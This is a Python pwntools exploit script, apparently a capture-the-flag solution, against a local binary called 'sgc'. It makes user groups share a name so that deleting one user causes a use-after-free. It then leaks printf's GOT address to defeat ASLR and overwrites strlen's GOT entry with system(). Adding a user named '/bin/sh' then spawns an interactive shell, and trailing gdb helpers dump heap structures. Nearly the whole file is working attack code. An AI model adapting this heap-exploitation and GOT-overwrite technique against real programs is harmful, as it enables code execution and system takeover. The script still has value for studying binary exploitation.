#!/usr/bin/env python

import pwn
import time 
import sys

def bytesToInt(listOfBytes):
  retVal = 0
  
  listOfBytes.reverse()
  for curByte in listOfBytes:
    retVal += curByte
    retVal = retVal << 8

  return retVal

def getUserNameBytes(p, userId):
  
  p.sendline('2')

  p.recvuntil('index')
  p.sendline(str(userId))

  userRawData = p.recvuntil("Action")

  userLines = userRawData.split("\n")
  
  NAME_STRING = "Name: "
  retVals = []
  for singleLine in userLines:
    if NAME_STRING in singleLine:

      startOfName = singleLine.find(NAME_STRING)
      justName = singleLine[startOfName + len(NAME_STRING):]
      # print("Group={}".format(hex(justGroup)))

      hexStr = ""
      for singleChar in justName:
        hexStr += hex(ord(singleChar)) + " "
        retVals.append(ord(singleChar))

      # print("Group={} = {}".format(hexStr, justGroup))
  
  return retVals

def getGroupNameBytesByUser(p, userId):
  
  p.sendline('2')

  p.recvuntil('index')
  p.sendline(str(userId))

  userRawData = p.recvuntil("Action")

  userLines = userRawData.split("\n")
  
  GROUP_STRING = "Group: "
  retVals = []
  for singleLine in userLines:
    if GROUP_STRING in singleLine:

      startOfGroup = singleLine.find(GROUP_STRING)
      justGroup = singleLine[startOfGroup + len(GROUP_STRING):]
      # print("Group={}".format(hex(justGroup)))

      hexStr = ""
      for singleChar in justGroup:
        hexStr += hex(ord(singleChar)) + " "
        retVals.append(ord(singleChar))

      # print("Group={} = {}".format(hexStr, justGroup))
  
  return retVals

def displayUserName(p, i):
  rawBytes = getUserNameBytes(p, i)

  nameString = ""
  hexString = ""
  for singleByte in rawBytes:
    nameString += chr(singleByte)
    hexString += hex(singleByte) + " "
  print("User {} is named {} = {}".format(i, hexString, nameString))


def displayGroupNameByUser(p, userId):
  rawBytes = getGroupNameBytesByUser(p, userId)

  nameString = ""
  hexString = ""
  for singleByte in rawBytes:
    nameString += chr(singleByte)
    hexString += hex(singleByte) + " "
  print("User {} is in group {} = {}".format(userId, hexString, nameString))

def addUser(p, name, group, age):
  p.sendline('0')
  
  p.recvuntil("name")
  p.sendline(name)

  p.recvuntil("group")
  p.sendline(group)

  p.recvuntil("age")
  p.sendline(str(age))

  p.recvuntil("Action")
  print("Added user {}, group is {}".format(name, group))

def deleteUser(p, index):
  p.sendline('4')

  p.recvuntil('index')
  p.sendline(str(index))

  p.recvuntil("Action")

def setGroupName(p, index, propSetting, groupName):
  p.sendline('3')

  p.recvuntil("index")
  p.sendline(str(index)) # user id

  p.recvuntil('y/n')
  p.sendline(propSetting) # do propogate.  this will change the name of the group in the group list

  p.recvuntil('name')
  p.sendline(groupName)

  p.recvuntil("Action")

def gdbDumpGroupCommand(groupId):
  retData =  "echo \\nGroup {}:\\n\n".format(groupId)

  # Dump out the pointer from the group list to the GroupDbEntry  
  retData += "x/1xg (0x6023e0 + 0x8 * {})\n".format(groupId)
 
  # Dump out the data in the GroupDbEntry
  retData += "x/2xg *(0x6023e0 + 0x8 * {})\n".format(groupId)
 
  # Dump out the contents of the Group Name field
  retData += "x/24xb **(0x6023e0 + 0x8 * {})\n".format(groupId)

  return retData

def gdbDumpUser(userId):
  retData  = "echo \\nUser {}:\\n\n".format(userId)

  # Pointer in the user list
  retData += "x/1xg (0x6020e0 + 0x8 * {})\n".format(userId)

  # UserDbEntry data
  retData += "x/3xg *(0x6020e0 + 0x8 * {})\n".format(userId)

  # User name
  retData += "x/s *(*(0x6020e0 + 0x8 * {}) + 0x8)\n".format(userId)
  retData += "x/16xb *(*(0x6020e0 + 0x8 * {}) + 0x8)\n".format(userId)

  # Group data
  retData += "x/s *(*(0x6020e0 + 0x8 * {}) + 0x10)\n".format(userId)
  retData += "x/3xg *(*(0x6020e0 + 0x8 * {}) + 0x10)\n".format(userId)

  return retData

def gdbDumpUserGroup(userId, omitBeginning = False):
  if not omitBeginning:
    retData  = "echo \\nUser {} Group Data:\\n\n".format(userId)

    # UserDbEntry data
    retData += "x/3xg *(0x6020e0 + 0x8 * {})\n".format(userId)
  else:
    retData = ""

  # GroupDbEntry data
  retData += "x/2xg *(*(0x6020e0 + 0x8 * {}) + 0x10)\n".format(userId)

  # Dump out the contents of the Group Name field
  retData += "x/24xb **(*(0x6020e0 + 0x8 * {}) + 0x10)\n".format(userId)

  return retData





# Start of script

p = pwn.process("./sgc")
p.settimeout(1)

print("** Adding 10 users\n" + p.recvuntil("Action"))

# Adding user P in group @@@@@@@@@@_0, Q in group AAAAAAAAAA_1, and so on
for i in range(0,10):
  addUser(p, "{}{}".format( chr(0x50 + i) * (i + 1) * 4,i), chr(0x40 + i) * 9 + "_{}".format(i), i)

# Change the first 10 users group to the last group (they will all be the same
# group name)

for i in range(0,9):
  setGroupName(p, i, 'y', "IIIIIIIII_9")

# We now have 10 entrys in the group list that have the same group name.  If we
# delete a user with this group name, it will cause all of these groups to be
# deleted.  Then the other users that still exists can access heap memory that
# has been free()-ed.

print("** Here are all the group names:")

for i in range(0, 10):
  displayGroupNameByUser(p,i)

print("** Now we have deleted user 0, here are the rest of the group names")

deleteUser(p, 0)
time.sleep(2)

for i in range(1, 10):
  displayGroupNameByUser(p,i)

print("** Now we are going to add some more users")

# This will be the new user 0
addUser(p, "1234"*6, "GPxxxxxx", 99)

for i in range(10,20):
  addUser(p, "a" * (i - 9), "GPabcd{}".format(i), i)

sgcElf = pwn.elf.ELF("./sgc")
printfPltAddr = sgcElf.got['printf']
strlenPltAddr = sgcElf.got['strlen']
print("GOT Address of printf = " + hex(printfPltAddr))
print("GOT Address of strlen = " + hex(strlenPltAddr))

# The address for printf is a bit weird here because the printf for my system happens to have
# a 0x00 in it, but the libc from the CTF doesn't IIRC.  The printf is really at 0x602040

PRINTF_ADDR = chr(0x41) + chr(0x20) + chr(0x60) 
STRLEN_ADDR = chr(0x30) + chr(0x20) + chr(0x60)

# I identified after running and randomly populating fields, that at this point with these inputs
# that user 1 group name is a buffer (0x18 bytes), that aligns directly with user 13 user data.

# Set User 1 group name 2nd word (user 13 group name ptr) to address of printf in GOT
setGroupName(p, 1, 'y', "u" * 0x8 + PRINTF_ADDR)

#for i in range(0, 20):
displayGroupNameByUser(p,13)

printfAddressAslr = getUserNameBytes(p, 13);
printfAddrWord = bytesToInt(printfAddressAslr)

# So with this info, we can defeat the ASLR and determine where things are loaded in libc
print("Printf address is : {}".format(hex(printfAddrWord)))


#libcElf = pwn.elf.ELF('libc-2.26.so')
libcElf = pwn.elf.ELF('/lib/x86_64-linux-gnu/libc.so.6')

printfAddr = libcElf.symbols['printf']
systemAddr = libcElf.symbols['system']

print("printf address in libc = " + hex(printfAddr))
print("system address in libc = " + hex(systemAddr))

# Determine the address of system in libc when ASLR applied
systemAddrAslr = systemAddr - printfAddr + printfAddrWord
print("Address for system should be {}".format(hex(systemAddrAslr)))

# Lets point our controlled pointer at strlen GOT entry and overwrite with system address
setGroupName(p, 1, 'y', "u" * 0x10 + STRLEN_ADDR)

# Lets overwrite strlen with system
setGroupName(p, 13, 'y', pwn.util.packing.p64(systemAddrAslr))

# Lets add /bin/sh user!!!!
addUser(p, "/bin/sh", "Pwned", 1337)

p.interactive()

# Debugging stuff
gdbScript = '''
echo UserList:\\n
x/20gx 0x6020e0


echo \\nGroupList\\n
x/20gx 0x6023e0

echo \\nAddress of printf:\\n
x/1i printf

echo \\nDumpTest\\n

'''

gdbScript += gdbDumpGroupCommand(2)
for i in range(0,14):
  gdbScript += gdbDumpUser(i)

pwn.gdb.attach(p, gdbScript)



while(True):
  time.sleep(1)





